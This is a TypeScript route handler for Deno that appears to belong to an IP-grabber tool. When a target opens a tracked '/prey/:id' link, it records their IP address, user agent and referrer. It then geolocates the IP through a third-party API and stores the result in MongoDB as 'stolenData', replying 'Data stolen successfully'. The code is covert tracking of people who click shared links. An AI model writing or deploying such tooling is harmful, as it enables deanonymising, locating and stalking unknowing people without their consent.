import { RouterContext } from "deps";
import { format } from "https://deno.land/std@0.91.0/datetime/mod.ts";
import {/*serviceCollection,*/ JwtService, MongoService} from "../services/services.ts"

const preys = async ({ request, response, params}: RouterContext<"/prey/:id">) => {
  // TODO: Move scans to a helper class
  const mongoService = new MongoService();
  const linkInfo = await mongoService.findPrey(params.id);
    
  let _response = undefined;
  response.headers.set("Content-Type", "application/json");

  if(!linkInfo){
    return response.body = JSON.stringify({
      success: false,
      message: "Invalid link"
    });
  }

  let requestInfo = {
    agent: request.headers.get('user-agent'), // User Agent we get from headers
    referrer: request.headers.get('referrer'), //  Likewise for referrer
    ip: request.headers.get('x-forwarded-for') || request.ip, // Get IP - allow for proxy
  };
  let apiKey = Deno.env.get("GEOIP_KEY")!;
  let testIp = "188.217.56.21"
  const geoApi = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${testIp}`);
  let isp = await geoApi.json();
  
  const date = format(new Date(), "dd-MM-yyyy HH:mm:ss");
  const stolenData = {
    date: date,
    request: requestInfo,
    isp: isp,
  };

  const storedPrey = await mongoService.createPrey(params.id, stolenData);

 // const hunter = JSON.parse(JSON.stringify(linkInfo)).hunter;
  _response = {
    success: true,
    message: "Data stolen successfully"
  };
  
  response.body = JSON.stringify(_response);
};

export default preys;
